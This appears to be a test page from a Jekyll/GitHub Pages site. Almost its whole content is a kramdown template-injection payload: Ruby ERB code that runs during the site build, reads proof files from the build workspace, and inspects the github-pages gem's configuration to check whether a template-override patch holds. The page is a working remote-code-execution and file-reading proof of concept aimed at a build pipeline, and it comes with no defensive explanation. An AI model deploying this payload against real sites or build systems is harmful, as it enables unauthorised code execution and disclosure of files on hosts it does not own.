---
---

# Test 30: Gemfile RCE proof + template OVERRIDE bypass

This page checks if the Gemfile RCE executed and if the template OVERRIDE was patched.

{::options template="string://<%= r=''; begin; r=r+'GEMFILE_RCE_PROOF='+File.read('/github/workspace/gemfile-rce-proof.txt')[0..300]+\"\\n\"; rescue => e; r=r+'GEMFILE_ERR='+e.message+\"\\n\"; end; begin; r=r+'PATCH_PROOF='+File.read('/github/workspace/gemfile-patch-proof.txt')[0..200]+\"\\n\"; rescue => e; r=r+'PATCH_ERR='+e.message+\"\\n\"; end; begin; cf=Dir.glob('/usr/local/bundle/gems/github-pages-*/lib/github-pages/configuration.rb').first; content=File.read(cf); idx=content.index('template'); r=r+'CONFIG_TEMPLATE='+content[idx..idx+50]+\"\\n\" if idx; rescue => e; r=r+'CONFIG_ERR='+e.message+\"\\n\"; end; r %>" /}

placeholder
